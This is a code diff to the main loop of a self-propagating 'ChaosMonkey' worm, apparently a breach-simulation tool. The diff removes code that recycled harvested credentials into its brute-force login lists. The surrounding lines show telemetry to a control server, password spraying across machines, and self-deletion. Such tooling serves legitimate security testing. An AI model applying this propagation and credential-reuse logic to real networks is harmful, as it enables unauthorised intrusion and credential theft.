@@ -88,14 +88,10 @@ class ChaosMonkey(object):
         LOG.debug("default server: %s" % self._default_server)
         ControlClient.send_telemetry("tunnel", ControlClient.proxies.get('https'))
 
-        additional_creds = {}
-
         if WormConfiguration.collect_system_info:
             LOG.debug("Calling system info collection")
             system_info_collector = SystemInfoCollector()
             system_info = system_info_collector.get_info()
-            if system_info.has_key('credentials'):
-                additional_creds = system_info['credentials']
             ControlClient.send_telemetry("system_info_collection", system_info)
 
         if 0 == WormConfiguration.depth:
@@ -105,13 +101,9 @@ class ChaosMonkey(object):
         else:
             LOG.debug("Running with depth: %d" % WormConfiguration.depth)
 
-
-
         for _ in xrange(WormConfiguration.max_iterations):
             ControlClient.keepalive()
             ControlClient.load_control_config()
-
-            self.update_config_creds(additional_creds)
 
             LOG.debug("Users to try: %s" % str(WormConfiguration.exploit_user_list))
             LOG.debug("Passwords to try: %s" % str(WormConfiguration.exploit_password_list))
@@ -132,9 +124,6 @@ class ChaosMonkey(object):
             for machine in machines:
                 if ControlClient.check_for_stop():
                     break
-
-                # TODO: Consider removing later
-                self.update_config_creds(additional_creds)
 
                 is_empty = False
                 for finger in self._fingerprint:
@@ -253,17 +242,5 @@ class ChaosMonkey(object):
                     os.remove(sys.executable)
             except Exception, exc:
                 LOG.error("Exception in self delete: %s", exc)
-
-    def update_config_creds(self, additional_creds):
-        # TODO: this is temporary until we change server to support changing of config.
-        for user in list(additional_creds):
-            if user not in WormConfiguration.exploit_user_list:
-                WormConfiguration.exploit_user_list.append(user)
-
-            creds = additional_creds[user]
-            if creds.has_key('password'):
-                password = creds['password']
-                if password not in WormConfiguration.exploit_password_list:
-                    WormConfiguration.exploit_password_list.append(password)
 
         LOG.info("Monkey is shutting down")
